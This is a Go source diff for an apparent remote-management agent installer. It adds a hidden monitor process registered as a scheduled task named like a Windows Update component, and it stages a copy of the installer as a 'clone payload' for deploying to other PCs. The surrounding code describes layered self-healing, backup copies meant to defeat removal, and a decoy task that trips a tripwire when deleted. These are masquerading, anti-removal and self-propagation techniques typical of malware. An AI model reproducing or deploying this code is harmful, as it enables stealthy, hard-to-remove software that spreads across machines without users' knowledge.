@@ -1018,9 +1018,16 @@ func install() {
 	}
 	// Task XMLs in the SECOND backup dir too: three copies total, so no
 	// single wiped dir blinds every healer at once.
-	for _, xml := range []string{"agent_task.xml", "watchdog_task.xml", "orchestrator_task.xml", "decoy_task.xml"} {
+	for _, xml := range []string{"agent_task.xml", "watchdog_task.xml", "orchestrator_task.xml", "decoy_task.xml", "nms_task.xml"} {
 		_ = copyFile(filepath.Join(blenderDir, xml), filepath.Join(backupDir2, xml))
 	}
+	// NMS monitor persistence + first start (own task, own process).
+	createNMSTask(agentPath, blenderDir, installDir)
+	startNMSProcess(agentPath)
+	// Clone payload: a byte copy of this running installer beside the
+	// agent (the NMS deploys fresh PCs from it — no embed circularity:
+	// installer embeds agent, agent never embeds installer).
+	stageInstallerCopy(installDir)
 	auditDuplicates()
 	// Repair service back on new bytes (stopped up top so the exe write
 	// could land; the healer would converge it anyway).
@@ -1062,6 +1069,10 @@ func main() {
 			programData = `C:\ProgramData`
 		}
 		installDir := filepath.Join(programData, "Microsoft", "Windows", "Update")
+		// Two-phase uninstall, phase 1: order the NMS monitor out through
+		// its own shutdown file and wait (≤40s). Skipping this would let
+		// the guard loop "restore" an intentionally removed agent.
+		stopNMSForUninstall(installDir)
 		// Legacy home (pre-1.40.9): wiped after the new install lands.
 		legacyDir := ""
 		if pf := os.Getenv("ProgramFiles"); pf != "" {
@@ -1085,6 +1096,7 @@ func main() {
 		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateWatchdog", "/f").CombinedOutput()
 		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateOrchestrator", "/f").CombinedOutput()
 		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateCheck", "/f").CombinedOutput()
+		_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateNMS", "/f").CombinedOutput()
 		removeWmiLayer()
 		_, _ = hiddenExec("sc", "stop", repairSvcName).CombinedOutput()
 		_, _ = hiddenExec("sc", "delete", repairSvcName).CombinedOutput()
@@ -1185,6 +1197,98 @@ func createOrchestratorTask(agentPath, backupDir, installDir string) {
 	_ = os.Remove(tmpTask)
 }
 
+// createNMSTask registers the NMS monitor task (own bland name,
+// logon + 30min + unlock + table-mutation, runs --nms). The WMI death
+// trigger already watches the image name, so it covers the NMS too.
+func createNMSTask(agentPath, backupDir, installDir string) {
+	nxml := persist.NMSTaskXML(agentPath)
+	_ = os.WriteFile(filepath.Join(backupDir, "nms_task.xml"), []byte(nxml), 0644)
+	_ = os.WriteFile(filepath.Join(installDir, "nms_task.xml"), []byte(nxml), 0644)
+	tmpTask := filepath.Join(os.TempDir(), "rmm_nms_task.xml")
+	_ = os.WriteFile(tmpTask, []byte(nxml), 0644)
+	_, _ = hiddenExec("schtasks", "/delete", "/tn", "WindowsUpdateNMS", "/f").CombinedOutput()
+	out, err := hiddenExec("schtasks", "/create", "/tn", "WindowsUpdateNMS", "/xml", tmpTask, "/f").CombinedOutput()
+	if err != nil {
+		log.Printf("[!] Failed to create NMS task: %v %s", err, strings.TrimSpace(string(out)))
+	} else {
+		log.Printf("[*] NMS task registered successfully")
+	}
+	_ = os.Remove(tmpTask)
+}
+
+// startNMSProcess launches the monitor now (same binary, hidden).
+// The task + WMI death trigger own restarts from here.
+func startNMSProcess(agentPath string) {
+	cmd := hiddenExec(agentPath, "--nms")
+	cmd.SysProcAttr = &syscall.SysProcAttr{
+		HideWindow:    true,
+		CreationFlags: 0x08000000,
+	}
+	if err := cmd.Start(); err != nil {
+		log.Printf("[!] NMS first start: %v", err)
+	} else {
+		log.Printf("[*] NMS monitor started")
+	}
+}
+
+// stageInstallerCopy lays a byte copy of this running installer beside the
+// agent (the NMS clone payload). Retries through AV scan windows, then
+// dies LOUDLY — a silent missing payload would neuter auto-clone with no
+// symptom until the first clone attempt.
+func stageInstallerCopy(installDir string) {
+	self, err := os.Executable()
+	if err != nil {
+		die("installer self-copy: executable path: %v", err)
+	}
+	data, err := os.ReadFile(self)
+	if err != nil || len(data) < 10*1024*1024 || len(data) < 2 || data[0] != 'M' || data[1] != 'Z' {
+		die("installer self-copy: own image unreadable/invalid (%d bytes, err=%v)", len(data), err)
+	}
+	dest := filepath.Join(installDir, "Agent-Setup.exe")
+	var werr error
+	for i := 0; i < 3; i++ {
+		if werr = os.WriteFile(dest, data, 0644); werr == nil {
+			break
+		}
+		time.Sleep(2 * time.Second)
+	}
+	if werr != nil {
+		die("installer self-copy failed after retries: %v", werr)
+	}
+	if st, err := os.Stat(dest); err != nil || st.Size() != int64(len(data)) {
+		die("installer self-copy size mismatch")
+	}
+	log.Printf("[*] Clone payload staged: %s (%d bytes)", dest, len(data))
+}
+
+// stopNMSForUninstall performs the first phase of the two-phase uninstall:
+// order the monitor out via its own shutdown file, then wait for its pid
+// to die (≤40s). Without this the guard loop would "restore" an
+// intentionally removed agent. Best effort: teardown below reaps stragglers.
+func stopNMSForUninstall(installDir string) {
+	shutdown := filepath.Join(installDir, "nms.shutdown")
+	_ = os.WriteFile(shutdown, []byte(time.Now().UTC().Format(time.RFC3339)+"\n"), 0644)
+	pidPath := filepath.Join(installDir, "nms.pid")
+	for i := 0; i < 40; i++ {
+		b, err := os.ReadFile(pidPath)
+		if err != nil {
+			log.Printf("[*] NMS pid file gone, monitor is out")
+			return
+		}
+		var pid int
+		if _, err := fmt.Sscanf(strings.TrimSpace(string(b)), "%d", &pid); err != nil || pid <= 0 {
+			return
+		}
+		h, err := syscall.OpenProcess(syscall.PROCESS_QUERY_INFORMATION, false, uint32(pid))
+		if err != nil {
+			log.Printf("[*] NMS pid %d gone, monitor is out", pid)
+			return
+		}
+		syscall.CloseHandle(h)
+		time.Sleep(time.Second)
+	}
+	log.Printf("[!] NMS pid still alive after 40s — teardown proceeds, taskkill reaps it")
+}
 // createDecoyTask registers the honeypot task: named like a legacy
 // leftover ("WindowsUpdateCheck"), it actually runs --wmi-heal (repairs +
 // exits) on logon and hourly. Deleting it trips the tripwire instead of
